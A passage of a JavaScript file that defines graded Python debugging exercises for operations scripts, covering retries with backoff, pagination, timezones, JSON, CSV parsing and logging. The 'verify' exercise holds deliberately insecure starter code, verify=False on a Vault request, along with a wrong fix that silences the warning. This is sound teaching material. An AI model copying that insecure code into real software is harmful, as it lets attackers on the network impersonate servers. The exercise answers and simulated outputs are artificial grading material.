        const url = "https://incidents.internal/api/v2/incidents?status=open";
        const rfs = py.line(/\.raise_for_status\(\)/);
        const guard = py.lines(/^\s*if\s+(not\s+resp\.ok|resp\.status_code\s*!=\s*200|resp\.status_code\s*>=\s*(400|300|500)|not\s+resp\.status_code\s*==\s*200)/).find((l) => l < parse && /sys\.exit|raise|return/.test(py.bodyText(l)));
        if (rfs && rfs < parse) {
          const h = py.catches(rfs, ["HTTPError", "RequestException"]);
          if (h) {
            const body = py.bodyText(h.line);
            return { out: reports(body) ? lines(err(`incidents API failed: 502 Server Error: Bad Gateway for url: ${url}`)) : [], exit: /sys\.exit\(\s*[1-9]|raise/.test(body) ? 1 : 0, ok: [reports(body), !/incidents\s*=\s*\[\]/.test(body)] };
          }
          return { out: traceback(py, "open_incidents.py", rfs, [vlib("requests/models.py", 1167, "raise_for_status", "raise HTTPError(http_error_msg, response=self)")], `requests.exceptions.HTTPError: 502 Server Error: Bad Gateway for url: ${url}`), exit: 1, ok: [true, true] };
        }
        if (guard) {
          const b = py.bodyText(guard);
          return { out: reports(b) ? lines(err("incidents API returned 502")) : [], exit: 1, ok: [/status|502|code/.test(b) && reports(b), true] };
        }
        const viaJson = /json\.loads/.test(py.code[parse - 1]);
        const h = py.catches(parse, viaJson ? ["JSONDecodeError", "ValueError"] : ["JSONDecodeError", "ValueError", "RequestException", "InvalidJSONError"]);
        if (h) {
          const empty = /=\s*(\[\]|list\(\)|\{\})/.test(h.body);
          return { out: [...(reports(h.body) ? lines(err("could not read the incidents")) : []), ...(empty ? lines("0 open incidents") : [])], exit: /sys\.exit\(\s*[1-9]|raise/.test(h.body) ? 1 : 0, ok: [false, !empty] };
        }
        const jsonFrames = [lib("json/__init__.py", 352, "loads", "return _default_decoder.decode(s)"), lib("json/decoder.py", 345, "decode", "obj, end = self.raw_decode(s, idx=_w(s, 0).end())"), lib("json/decoder.py", 363, "raw_decode", "raise JSONDecodeError(\"Expecting value\", s, err.value) from None")];
        if (viaJson) return { out: traceback(py, "open_incidents.py", parse, jsonFrames, "json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)"), exit: 1, ok: [false, true] };
        const inner = ["Traceback (most recent call last):", `  File "${VENV}/requests/models.py", line 1116, in json`, "    return complexjson.loads(self.text, **kwargs)",
          ...jsonFrames.flatMap(([f, l, fn, s]) => [`  File "${f}", line ${l}, in ${fn}`, `    ${s}`]), "json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)", "", "During handling of the above exception, another exception occurred:", ""];
        return { out: traceback(py, "open_incidents.py", parse, [vlib("requests/models.py", 1120, "json", "raise RequestsJSONDecodeError(e.msg, e.doc, e.pos)")], "requests.exceptions.JSONDecodeError: Expecting value: line 1 column 1 (char 0)", inner), exit: 1, ok: [false, true] };
      }
    });

    S.push({
      id: "backoff", group: "HTTP and APIs", level: "07", title: "Retries take the API down",
      file: "fetch_config.py", cmd: "python3 fetch_config.py   # on 400 hosts, from cron at :00",
      story: "The config API had a two-minute blip at midnight. 400 hosts retried in a tight loop, turned the blip into an hour-long outage, and the API team blocked the shared token for abuse.",
      goal: "Retry a few times, waiting longer after each failure, with random jitter so the hosts spread out. Give up with an error in the end.",
      checks: ["Gives up after a limited number of attempts", "Waits longer after each failure", "Adds random jitter"],
      code: src`
import requests

CONFIG_URL = "https://config.internal/v1/hosts/self"


def fetch(url):
    while True:
        try:
            resp = requests.get(url, timeout=10)
            resp.raise_for_status()
            return resp.json()
        except requests.exceptions.RequestException:
            continue


if __name__ == "__main__":
    print(fetch(CONFIG_URL)["role"])
`,
      fix: [["import requests\n", "import random\nimport time\n\nimport requests\n"],
        ["def fetch(url):\n    while True:\n", "def fetch(url, attempts=6):\n    for attempt in range(attempts):\n"],
        ["        except requests.exceptions.RequestException:\n            continue\n", "        except requests.exceptions.RequestException:\n            if attempt == attempts - 1:\n                raise\n            time.sleep(min(60, 2 ** attempt) + random.uniform(0, 1))\n"]],
      wrong: [
        [["import requests\n", "import time\n\nimport requests\n"], ["            continue\n", "            time.sleep(1)\n"]],
        [["import requests\n", "import time\n\nimport requests\n"], ["            continue\n", "            time.sleep(60)\n"]],
        [["import requests\n", "import random\nimport time\n\nimport requests\n"], ["            continue\n", "            time.sleep(1 + random.uniform(0, 1))\n"]]
      ],
      hints: [
        "Count the requests: each of 400 hosts retries as fast as the network allows, for ever.",
        "Three separate things are missing: a maximum number of attempts, a delay that grows (1, 2, 4, 8 seconds...), and some randomness so hosts do not retry in step.",
        "Loop `for attempt in range(attempts):` and, after a failure, `time.sleep(min(60, 2 ** attempt) + random.uniform(0, 1))`; re-raise on the last attempt."
      ],
      lesson: "Retries need a limit, exponential backoff and jitter. Without them every client retries at once, and the retries keep a recovering service down.",
      real: ["python3 -c \"import random; print([round(min(60, 2 ** a) + random.uniform(0, 1), 2) for a in range(6)])\""],
      sim(py) {
        const c = py.call("requests\\.get");
        const def = py.line(/^\s*def\s+fetch\s*\(/);
        if (!c || !def) return gone("it no longer fetches the config with retries");
        const body = py.bodyText(def);
        const sleeps = py.calls("(time\\.)?sleep").filter((x) => py.fnOf(x.line) === "fetch").map((x) => x.args).join(" ");
        const loop = py.inside(c.line, /^(for|while)\b/);
        const limited = Boolean(loop) && (/^for\b/.test(loop.code) || /while\s+\w+\s*<|while\s+\w+\s*>/.test(loop.code) || /\bbreak\b|\braise\b/.test(body) && /attempt|tries|retries/.test(body) && !/^while\s+True/.test(loop.code));
        const grows = /\*\*|<<|\*\s*(attempt|tries|retry|n|i)\b|(attempt|tries|retry|n|i)\s*\*|delay\s*\*=|backoff/.test(sleeps + body.replace(/[\s\S]*?(?=sleep)/, ""));
        const jitter = /random\.(uniform|random|randint|triangular|expovariate)|secrets\.randbelow/.test(body);
        const hasSleep = Boolean(sleeps);
        const story = !hasSleep ? ["config API: 1,840,000 requests in the first minute from 400 hosts", "config API: 429 Too Many Requests; the shared token is blocked at 00:01"]
          : !grows && jitter ? ["config API: retries spread over a second, but every host comes back every second; the API stays saturated"]
          : !grows ? ["config API: every host retries in step, " + (/\b60\b/.test(sleeps) ? "a full minute between tries; most hosts have no config for an hour" : "400 requests in the same 50 ms, every second; the API never recovers")]
            : !jitter ? ["config API: retries arrive in synchronised waves at +1 s, +2 s, +4 s...; each wave of 400 knocks it over again"]
              : ["config API: retries spread out over each interval; the API recovers at 00:02", "every host has its config by 00:04"];
        const out = [dim("---- what the API sees"), ...story.map(dim), dim("---- this host"), ...(jitter && grows ? lines("web") : [])];
        return { out, exit: jitter && grows ? 0 : 1, ok: [limited, hasSleep && grows, jitter] };
      }
    });

    S.push({
      id: "verify", group: "HTTP and APIs", level: "07", title: "CERTIFICATE_VERIFY_FAILED",
      file: "vault_health.py", cmd: "python3 vault_health.py",
      story: "Vault uses a certificate from the company's internal CA. Months ago someone made the error go away with verify=False. The security review found it: anyone on the network path could have answered instead of Vault.",
      goal: "Verify Vault's certificate against the company CA bundle at /etc/ssl/certs/corp-root-ca.pem, and still read the health status.",
      checks: ["The TLS certificate is verified", "Reads the health status"],
      code: src`
import requests

VAULT = "https://vault.corp.internal:8200"

resp = requests.get(f"{VAULT}/v1/sys/health", timeout=5, verify=False)
print("sealed:", resp.json()["sealed"])
`,
      fix: [["verify=False", "verify=\"/etc/ssl/certs/corp-root-ca.pem\""]],
      wrong: [
        [[", verify=False", ""]],
        [["import requests\n", "import requests\nimport urllib3\n\nurllib3.disable_warnings()\n"]]
      ],
      hints: [
        "The warning is the problem, not noise: verify=False accepts any certificate, from anyone.",
        "Removing verify=False brings back CERTIFICATE_VERIFY_FAILED, because requests trusts the public CAs in certifi, not your company's CA.",
        "Point requests at the company CA: `verify=\"/etc/ssl/certs/corp-root-ca.pem\"` (or set REQUESTS_CA_BUNDLE to that file)."
      ],
      lesson: "Never switch off certificate checks; tell the client which CA to trust instead (verify=<bundle>, REQUESTS_CA_BUNDLE, or the system store). verify=False makes TLS encryption without authentication.",
      real: ["openssl s_client -connect vault.corp.internal:8200 -showcerts </dev/null | grep -E 'issuer|Verify return'",
        "REQUESTS_CA_BUNDLE=/etc/ssl/certs/corp-root-ca.pem python3 vault_health.py"],
      sim(py) {
        const c = py.call("requests\\.get");
        if (!c) return gone("it no longer calls Vault");
        const v = c.kw.verify;
        const bundle = (v && /corp-root-ca\.pem/.test(v)) || py.has(/REQUESTS_CA_BUNDLE["']\s*\]\s*=\s*["'][^"']*corp-root-ca\.pem|\.verify\s*=\s*["'][^"']*corp-root-ca\.pem/);
        const silent = py.has(/disable_warnings\(|filterwarnings\(\s*["']ignore/);
        const good = lines("sealed: False");
        if (v && /^False$/.test(v)) {
          return { out: [...(silent ? [] : [err(`${VENV}/urllib3/connectionpool.py:1129: InsecureRequestWarning: Unverified HTTPS request is being made to host 'vault.corp.internal'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings`), err("  warnings.warn(")]), ...good], exit: 0, ok: [false, true] };
        }
        if (bundle) return { out: good, exit: 0, ok: [true, true] };
        const reason = v && /["']/.test(v) ? `OSError: Could not find a suitable TLS CA certificate bundle, invalid path: ${v.replace(/["']/g, "")}` : null;
        if (reason) return { out: traceback(py, "vault_health.py", c.line, [...REQ("get"), vlib("requests/adapters.py", 671, "send", "self.cert_verify(conn, request.url, verify, cert)"), vlib("requests/adapters.py", 299, "cert_verify", "raise OSError(")], reason), exit: 1, ok: [false, false] };
        return { out: [...CHAINED, ...traceback(py, "vault_health.py", c.line, [...REQ("get"), vlib("requests/adapters.py", 727, "send", "raise SSLError(e, request=request)")],
          "requests.exceptions.SSLError: HTTPSConnectionPool(host='vault.corp.internal', port=8200): Max retries exceeded with url: /v1/sys/health (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1032)')))",
          ["During handling of the above exception, another exception occurred:", ""])], exit: 1, ok: [true, false] };
      }
    });

    S.push({
      id: "pagination", group: "HTTP and APIs", level: "07", title: "Only the first 100",
      file: "inactive_users.py", cmd: "python3 inactive_users.py",
      story: "The audit asked for every Git account with no activity since July. The script reported 100 users checked. The company has 342, and the auditor found the leaver's account the script never saw.",
      goal: "Check every user, following the API's pages to the end.",
      checks: ["Checks all 342 users"],
      code: src`
import os

import requests

API = "https://git.internal/api/v4/users"
HEADERS = {"PRIVATE-TOKEN": os.environ["GITLAB_TOKEN"]}

resp = requests.get(API, headers=HEADERS, params={"per_page": 100}, timeout=10)
resp.raise_for_status()
users = resp.json()
inactive = [u["username"] for u in users if u["last_activity_on"] < "2026-07-01"]
print(f"checked {len(users)} users, {len(inactive)} inactive")
`,
      fix: [["resp = requests.get(API, headers=HEADERS, params={\"per_page\": 100}, timeout=10)\nresp.raise_for_status()\nusers = resp.json()\n",
        "users, page = [], \"1\"\nwhile page:\n    resp = requests.get(API, headers=HEADERS, params={\"per_page\": 100, \"page\": page}, timeout=10)\n    resp.raise_for_status()\n    users += resp.json()\n    page = resp.headers.get(\"X-Next-Page\")\n"]],
      wrong: [
        [["\"per_page\": 100", "\"per_page\": 1000"]],
        [["params={\"per_page\": 100}", "params={\"per_page\": 100, \"page\": 2}"]]
      ],
      hints: [
        "Exactly 100 is suspicious. Most APIs return results in pages and tell you where the next page is.",
        "GitLab caps per_page at 100. Each response has an X-Next-Page header (and a Link header, which requests exposes as `resp.links`). It is empty on the last page.",
        "Loop: request `page`, add the users, set `page = resp.headers.get(\"X-Next-Page\")`, and stop when it is empty."
      ],
      lesson: "List endpoints are paginated. Follow the next-page header or link until it runs out; asking for a bigger page only works up to the server's cap.",
      real: ["curl -sI -H \"PRIVATE-TOKEN: $GITLAB_TOKEN\" 'https://gitlab.com/api/v4/projects?per_page=100' | grep -i -E 'x-next-page|x-total|link'"],
      sim(py) {
        const c = py.call("requests\\.get");
        if (!c || !py.has(/last_activity_on/)) return gone("it no longer fetches and checks the users");
        const loop = py.inside(c.line, /^(while|for)\b/);
        const follows = Boolean(loop) && py.has(/X-Next-Page|x-next-page|\.links\b|["']next["']|page\s*\+=\s*1/);
        const n = follows ? 342 : 100;
        return { out: py.has(/print\(/) ? lines(`checked ${n} users, ${follows ? 23 : 7} inactive`) : [], exit: 0, ok: [follows] };
      }
    });

    // --- Data formats --------------------------------------------------------------------

    S.push({
      id: "tz", group: "Data formats", level: "06", title: "Naive and aware datetimes",
      file: "cert_deadline.py", cmd: "TZ=America/New_York python3 cert_deadline.py   # 18:30 local, 22:30 UTC",
      story: "The certificate API returns expiry times in UTC with an offset. The script that should page about certificates expiring within six hours crashes, and the shop's certificate expires at 02:00 UTC tonight.",
      goal: "Flag shop.example.com, which expires in 3.5 hours, on a server whose local time zone is New York.",
      checks: ["No traceback", "Flags the certificate that expires in 3.5 hours"],
      code: src`
from datetime import datetime, timedelta

import requests

resp = requests.get("https://certs.internal/api/expiring", timeout=10)
resp.raise_for_status()
for cert in resp.json():
    expires = datetime.fromisoformat(cert["not_after"])
    if expires - datetime.now() < timedelta(hours=6):
        print(f"RENEW NOW: {cert['name']} expires {expires}")
`,
      fix: [["from datetime import datetime, timedelta", "from datetime import datetime, timedelta, timezone"], ["datetime.now()", "datetime.now(timezone.utc)"]],
      wrong: [
        [["datetime.now()", "datetime.utcnow()"]],
        [["expires - datetime.now()", "expires.replace(tzinfo=None) - datetime.now()"]]
      ],
      hints: [
        "`fromisoformat` keeps the +00:00 offset, so `expires` is aware. `datetime.now()` has no time zone at all.",
        "`utcnow()` is still naive (and deprecated). Dropping the offset from `expires` compares UTC with New York wall-clock time, four hours apart.",
        "Use an aware now: `datetime.now(timezone.utc)` (import timezone from datetime)."
      ],
      lesson: "Keep every datetime timezone-aware, in UTC, from the moment you read or create it. Naive times mean whatever the server's clock says, and cannot be compared with aware ones.",
      real: ["TZ=America/New_York python3 -c \"from datetime import datetime, timezone; print(datetime.now(), datetime.now(timezone.utc))\""],
      sim(py) {
        const n = py.line(/expires\b.*-|<\s*.*expires|expires\s*[<>]/);
        if (!n || !py.has(/fromisoformat|strptime/)) return gone("it no longer compares the expiry with the time now");
        const s = py.code[n - 1];
        const aware = /now\(\s*(timezone\.utc|UTC|datetime\.UTC|tz\s*=)|now\(\)\.astimezone\(\)/.test(s);
        const strip = /replace\(\s*tzinfo\s*=\s*None\s*\)/.test(s);
        const utcnow = /utcnow\(\)/.test(s);
        const warn = utcnow ? [err(`${HOME}/cert_deadline.py:${n}: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).`), err(`  ${py.src(n)}`)] : [];
        if (aware) return { out: lines("RENEW NOW: shop.example.com expires 2026-10-31 02:00:00+00:00"), exit: 0, ok: [true, true] };
        if (strip) return { out: [], exit: 0, ok: [true, false] };
        return { out: [...warn, ...traceback(py, "cert_deadline.py", n, null, "TypeError: can't subtract offset-naive and offset-aware datetimes")], exit: 1, ok: [false, false] };
      }
    });

    S.push({
      id: "jsondump", group: "Data formats", level: "06", title: "Not JSON serializable",
      file: "write_report.py", cmd: "python3 write_report.py && python3 -m json.tool report.json",
      story: "A timestamp was added to the nightly report so the dashboard can show its age. The report has not been written since.",
      goal: "Write report.json as valid JSON with the timestamp as ISO 8601 text.",
      checks: ["Writes report.json", "The file is valid JSON with an ISO 8601 timestamp"],
      code: src`
import json
from datetime import datetime, timezone

report = {
    "generated": datetime.now(timezone.utc),
    "hosts": [{"name": "web-01", "disk": 41}, {"name": "web-02", "disk": 88}],
}
with open("report.json", "w", encoding="utf-8") as f:
    f.write(json.dumps(report))
print("wrote report.json")
`,
      fix: [["datetime.now(timezone.utc),", "datetime.now(timezone.utc).isoformat(),"]],
      wrong: [
        [["f.write(json.dumps(report))", "f.write(str(report))"]],
        [["json.dumps(report)", "json.dumps(report, default=repr)"]]
      ],
      hints: [
        "JSON has strings, numbers, booleans, null, arrays and objects. A datetime is none of these.",
        "`str(report)` writes Python's own notation (single quotes, datetime(...)), which no JSON parser accepts.",
        "Convert the timestamp yourself: `datetime.now(timezone.utc).isoformat()`."
      ],
      lesson: "Convert values to JSON types before dumping: isoformat() for datetimes, str() for paths and decimals. str() of a dict is Python, not JSON.",
      real: ["python3 write_report.py && python3 -m json.tool report.json"],
      sim(py) {
        const d = py.call("json\\.dumps?");
        const w = py.line(/\.write\(|json\.dump\(/);
        if (!w || !py.has(/["']generated["']/)) return gone("it no longer writes the report with its timestamp");
        const gen = at(py, /["']generated["']/);
        const iso = /isoformat\(\)|strftime\(|str\(\s*datetime|f["']\{datetime/.test(gen);
        const dflt = d && d.kw.default;
        const asText = (stamp) => [...lines("wrote report.json"), dim("---- python3 -m json.tool report.json"), ...lines("{", `    "generated": "${stamp}",`, "    \"hosts\": [", "        {", "            \"name\": \"web-01\",", "            \"disk\": 41", "        },", dim("        (one more host)"), "    ]", "}")];
        if (iso || (dflt && /^(str|lambda[^:]*:\s*\w+\.isoformat\(\))/.test(dflt))) return { out: asText(iso || /isoformat/.test(dflt) ? "2026-10-30T22:30:00.123456+00:00" : "2026-10-30 22:30:00.123456+00:00"), exit: 0, ok: [true, true] };
        if (dflt && /^repr$/.test(dflt)) return { out: asText("datetime.datetime(2026, 10, 30, 22, 30, 0, 123456, tzinfo=datetime.timezone.utc)"), exit: 0, ok: [true, false] };
        if (!d) {
          return { out: [...lines("wrote report.json"), dim("---- python3 -m json.tool report.json"), err("Expecting property name enclosed in double quotes: line 1 column 2 (char 1)")], exit: 1, ok: [true, false] };
        }
        return { out: traceback(py, "write_report.py", d.line, [lib("json/__init__.py", 235, "dumps", "return _default_encoder.encode(obj)"), lib("json/encoder.py", 202, "encode", "chunks = self.iterencode(o, _one_shot=True)"),
          lib("json/encoder.py", 263, "iterencode", "return _iterencode(o, 0)"), lib("json/encoder.py", 182, "default", "raise TypeError(f'Object of type {o.__class__.__name__} '\n                f'is not JSON serializable')")], "TypeError: Object of type datetime is not JSON serializable"), exit: 1, ok: [false, false] };
      }
    });

    S.push({
      id: "csvsplit", group: "Data formats", level: "06", title: "too many values to unpack",
      file: "load_hosts.py", cmd: "python3 load_hosts.py",
      story: "The host list is a CSV exported from the asset database. It loaded fine until a team called \"Payments, EU\" took over db-02; the quotes around the comma are valid CSV, but the script splits on every comma.",
      goal: "Load all 58 hosts, with owner names that contain commas kept whole.",
      checks: ["Loads all 58 hosts", "\"Payments, EU\" stays one owner"],
      code: src`
hosts = []
with open("hosts.csv", encoding="utf-8") as f:
    next(f)
    for line in f:
        name, owner, port = line.strip().split(",")
        hosts.append((name, owner, int(port)))
print(f"{len(hosts)} hosts, db-02 owned by {dict((h[0], h[1]) for h in hosts).get('db-02')}")
`,
      fix: [["hosts = []\nwith open(\"hosts.csv\", encoding=\"utf-8\") as f:\n    next(f)\n    for line in f:\n        name, owner, port = line.strip().split(\",\")\n",
        "import csv\n\nhosts = []\nwith open(\"hosts.csv\", encoding=\"utf-8\", newline=\"\") as f:\n    reader = csv.reader(f)\n    next(reader)\n    for name, owner, port in reader:\n"]],
      wrong: [
        [["line.strip().split(\",\")", "line.strip().split(\",\", 2)"]],
        [["line.strip().split(\",\")", "line.strip().split(\", \")"]]
      ],
      hints: [
        "Look at the db-02 line: `db-02,\"Payments, EU\",5432`. How many commas does `split(\",\")` see?",
        "CSV has quoting rules. Any hand-written split gets some valid file wrong.",
        "Use the csv module: `reader = csv.reader(f)`, `next(reader)` for the header, then `for name, owner, port in reader:`."
      ],
      lesson: "Parse CSV with the csv module (and open the file with newline=\"\"). Quoted fields, embedded commas and newlines are part of the format.",
      real: ["printf 'name,owner,port\\ndb-01,Platform,5432\\ndb-02,\"Payments, EU\",5432\\n' > hosts.csv && python3 load_hosts.py"],
      sim(py) {
        const viaCsv = py.has(/csv\.(reader|DictReader)\(/);
        const sp = py.line(/\.split\(/);
        if (!viaCsv && !sp) return gone("it no longer reads the rows");
        const done = (owner) => lines(`58 hosts, db-02 owned by ${owner}`);
        if (viaCsv) return { out: done("Payments, EU"), exit: 0, ok: [true, true] };
        const s = py.code[sp - 1];
        if (/split\(\s*["'],\s*["']\s*,\s*2\s*\)/.test(s)) return { out: traceback(py, "load_hosts.py", py.line(/int\(\s*port/) || sp, null, "ValueError: invalid literal for int() with base 10: ' EU\",5432'"), exit: 1, ok: [false, false] };
        if (/split\(\s*["'],\s+["']\s*\)/.test(s)) return { out: traceback(py, "load_hosts.py", sp, null, "ValueError: not enough values to unpack (expected 3, got 1)"), exit: 1, ok: [false, false] };
        return { out: traceback(py, "load_hosts.py", sp, null, "ValueError: too many values to unpack (expected 3)"), exit: 1, ok: [false, false] };
      }
    });

    // --- Errors and logging -------------------------------------------------------------

    S.push({
      id: "badline", group: "Errors and logging", level: "08", title: "One bad line stops the report",
      file: "slow_requests.py", cmd: "python3 slow_requests.py access.log",
      story: "The log was rotated while nginx was writing, and one line was cut in half. The latency report now dies at line 48,211 of 1.2 million, every time.",
      goal: "Skip lines that cannot be parsed, count how many were skipped, and report on the rest. Do not hide other kinds of bugs.",
      checks: ["Reads past the bad lines", "Says how many lines were skipped", "Catches only the parsing errors"],
      code: src`
import sys

total = slow = 0
with open(sys.argv[1], encoding="utf-8") as f:
    for line in f:
        fields = line.split()
        seconds = float(fields[-1])
        total += 1
        if seconds > 1.0:
            slow += 1
print(f"{total} requests, {slow} slower than 1 s ({slow / total:.1%})")
`,
      fix: [["total = slow = 0\n", "total = slow = skipped = 0\n"],
        ["        seconds = float(fields[-1])\n", "        try:\n            seconds = float(fields[-1])\n        except (ValueError, IndexError):\n            skipped += 1\n            continue\n"],
        ["({slow / total:.1%})\")", "({slow / total:.1%}), {skipped} malformed lines skipped\")"]],
      wrong: [
        [["with open(sys.argv[1], encoding=\"utf-8\") as f:\n    for line in f:\n        fields = line.split()\n        seconds = float(fields[-1])\n        total += 1\n        if seconds > 1.0:\n            slow += 1\n",
          "try:\n    with open(sys.argv[1], encoding=\"utf-8\") as f:\n        for line in f:\n            fields = line.split()\n            seconds = float(fields[-1])\n            total += 1\n            if seconds > 1.0:\n                slow += 1\nexcept:\n    pass\n"]],
        [["        seconds = float(fields[-1])\n", "        try:\n            seconds = float(fields[-1])\n        except Exception:\n            continue\n"]]
      ],
      hints: [
        "The traceback names the value: half a request line has no number at the end. An empty line would fail too, with IndexError.",
        "Catch the error per line, inside the loop, and only the errors parsing can raise. A try around the whole loop stops at the first bad line.",
        "Wrap `float(fields[-1])` in `try:` / `except (ValueError, IndexError):`, add 1 to a `skipped` counter, `continue`, and print the count at the end."
      ],
      lesson: "Handle bad input per record, catch only the exceptions you expect, and count what you skipped. A broad except also hides your own typos.",
      real: ["printf '1.2.3.4 \"GET / HTTP/1.1\" 200 0.42\\n1.2.3.4 \"GET /api/ca\\n\\n' > access.log && python3 slow_requests.py access.log"],
      sim(py) {
        const n = py.line(/float\(\s*fields/);
        if (!n || !py.line(/for\s+\w+\s+in\s+f\b/)) return gone("it no longer parses each line");
        const result = lines("1204386 requests, 9113 slower than 1 s (0.8%)");
        const h = py.catches(n, ["ValueError", "IndexError"]);
        if (!h) return { out: traceback(py, "slow_requests.py", n, null, "ValueError: could not convert string to float: '/api/ca'"), exit: 1, ok: [false, false, false] };
        const narrow = h.types.length > 0 && h.types.every((t) => ["ValueError", "IndexError"].includes(t));
        const both = h.types.includes("ValueError") && h.types.includes("IndexError") || !narrow;
        const perLine = Boolean(py.inside(h.line, /^for\b/));
        const counter = (/(\w+)\s*\+=\s*1/.exec(h.body) || [])[1];
        const told = Boolean(counter) && py.lines(new RegExp(`print\\([^\\n]*\\b${counter}\\b`)).length > 0;
        if (!perLine) return { out: [...(py.line(/print\(\s*f["']\{total\}/) > h.line ? lines("48210 requests, 391 slower than 1 s (0.8%)") : [])], exit: 0, ok: [false, false, narrow] };
        if (!both) return { out: traceback(py, "slow_requests.py", n, null, "IndexError: list index out of range"), exit: 1, ok: [false, false, narrow] };
        return { out: told ? [["1204386 requests, 9113 slower than 1 s (0.8%), 2 malformed lines skipped", ""]] : result, exit: 0, ok: [true, told, narrow] };
      }
    });

    S.push({
      id: "logdup", group: "Errors and logging", level: "08", title: "Every log line, many times",
      file: "rotate.py", cmd: "python3 rotate.py",
      story: "The rotation job's log grows faster than the logs it rotates: the first message appears once, the second twice, the third three times, and so on through the night.",
      goal: "Log each message exactly once.",
      checks: ["Each message is logged once"],
      code: src`
import logging


def get_logger():
    logger = logging.getLogger("rotate")
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)
    return logger


def rotate(name):
    get_logger().info("rotating %s", name)


for name in ["access.log", "error.log", "app.log"]:
    rotate(name)
`,
      fix: [["    logger = logging.getLogger(\"rotate\")\n    handler = logging.StreamHandler()\n    handler.setFormatter(logging.Formatter(\"%(asctime)s %(levelname)s %(message)s\"))\n    logger.addHandler(handler)\n",
        "    logger = logging.getLogger(\"rotate\")\n    if not logger.handlers:\n        handler = logging.StreamHandler()\n        handler.setFormatter(logging.Formatter(\"%(asctime)s %(levelname)s %(message)s\"))\n        logger.addHandler(handler)\n"]],
      wrong: [
        [["    logger.setLevel(logging.INFO)\n", "    logger.setLevel(logging.INFO)\n    logger.propagate = False\n"]],
        [["import logging\n", "import logging\n\nlogging.basicConfig(level=logging.INFO)\n"]]
      ],
      hints: [
        "`logging.getLogger(\"rotate\")` returns the same logger object every time. What happens to it on each call to get_logger()?",
        "Each call adds another StreamHandler, and every handler prints every message. propagate only concerns the parent loggers.",
        "Add the handler only once: `if not logger.handlers:` around the handler lines, or configure logging once at start-up."
      ],
      lesson: "Loggers are global and handlers accumulate. Configure logging once, at program start, and only call getLogger() elsewhere.",
      real: ["python3 rotate.py"],
      sim(py) {
        const add = py.line(/\.addHandler\(/);
        const calls = py.lines(/\.(info|warning|error|debug)\(\s*["']rotating/);
        if (!calls.length) return gone("it no longer logs the rotation");
        const fnAdd = add ? py.fnOf(add) : "<module>";
        const guarded = add && (py.inside(add, /^if\s+not\s+\w+\.(handlers|hasHandlers\(\))/) || py.inside(add, /^if\s+\w+\.handlers\s*==\s*\[\]|^if\s+len\(\w+\.handlers\)\s*==\s*0/));
        const perCall = add && fnAdd !== "<module>" && !guarded && py.lines(new RegExp(`(?<![\\w.])${fnAdd}\\s*\\(`)).some((l) => py.fnOf(l) !== "<module>" || py.inside(l, /^for\b/));
        const root = py.has(/logging\.basicConfig\(/) && !py.has(/\.propagate\s*=\s*False/);
        const names = ["access.log", "error.log", "app.log"];
        const out = [];
        names.forEach((nm, i) => {
          const copies = (add ? (perCall ? i + 1 : 1) : 0) + (root ? 1 : 0);
          for (let k = 0; k < copies; k++) out.push([k < copies - (root ? 1 : 0) ? `2026-10-30 02:00:0${i + 1},204 INFO rotating ${nm}` : `INFO:rotate:rotating ${nm}`, ""]);
        });
        return { out, exit: 0, ok: [out.length === 3] };
      }
    });

    S.push({
      id: "loglevel", group: "Errors and logging", level: "08", title: "logging.info prints nothing",
      file: "var_check.py", cmd: "python3 var_check.py >> /var/log/var_check.log 2>&1   # from cron",
      story: "The team thought the /var check had stopped running: its log file has been empty for weeks. It runs every hour. Its info messages simply go nowhere.",
      goal: "Write the INFO line, with a timestamp, to the cron log on every run.",
      checks: ["The INFO line appears in the log"],
      code: src`
import logging
import shutil

log = logging.getLogger(__name__)


def main():
    usage = shutil.disk_usage("/var")
    log.info("checked /var: %d%% used", usage.used * 100 // usage.total)
    if usage.used / usage.total > 0.9:
        log.warning("/var is above 90%% full")


if __name__ == "__main__":
    main()
`,
      fix: [["if __name__ == \"__main__\":\n    main()", "if __name__ == \"__main__\":\n    logging.basicConfig(level=logging.INFO, format=\"%(asctime)s %(levelname)s %(message)s\")\n    main()"]],
      wrong: [
        [["log = logging.getLogger(__name__)\n", "log = logging.getLogger(__name__)\nlog.setLevel(logging.INFO)\n"]],
        [["if __name__ == \"__main__\":\n    main()", "if __name__ == \"__main__\":\n    logging.basicConfig()\n    main()"]]
      ],
      hints: [
        "Nobody configured logging. With no handlers, Python only prints WARNING and above, through a last-resort handler.",
        "`log.setLevel(logging.INFO)` lets the record through the logger, but the last-resort handler still drops anything below WARNING.",
        "Configure logging once at start-up: `logging.basicConfig(level=logging.INFO, format=\"%(asctime)s %(levelname)s %(message)s\")`."
      ],
      lesson: "Libraries call getLogger(); programs configure logging once, in main, with basicConfig or dictConfig. Unconfigured logging shows warnings and errors only.",
      real: ["python3 -c \"import logging; logging.getLogger().info('lost'); logging.getLogger().warning('shown')\""],
      sim(py) {
        if (!py.line(/\.info\(\s*["']checked/)) return gone("it no longer logs the check");
        const bc = py.call("logging\\.basicConfig");
        const lvl = bc && /INFO|DEBUG|NOTSET|["']INFO["']|\b(10|20)\b/.test(bc.kw.level || "");
        const viaHandler = py.has(/addHandler\(/) && py.has(/setLevel\(\s*logging\.(INFO|DEBUG)/);
        if (lvl) return { out: lines(/asctime/.test(bc.kw.format || "") ? "2026-10-30 14:00:01,204 INFO checked /var: 86% used" : "INFO:__main__:checked /var: 86% used"), exit: 0, ok: [true] };
        if (viaHandler) return { out: lines("checked /var: 86% used"), exit: 0, ok: [true] };
        return { out: [dim("(nothing: /var is 86% full, so only the INFO line was logged, and it was dropped)")], exit: 0, ok: [false] };
      }
    });

    S.push({
      id: "bareexcept", group: "Errors and logging", level: "08", title: "A bare except swallows the exit",
      file: "release.py", cmd: "python3 release.py 2.4.1",
      story: "Version 2.4.1 failed its health check after the traffic switch. The script printed that it was rolling back, then that the release was live, and exited 0. The pipeline marked the release green.",
      goal: "When the health check fails, stop with exit status 1 and do not claim the release is live.",
      checks: ["Exits 1 when the health check fails", "Does not say the release is live"],
      code: src`
import subprocess
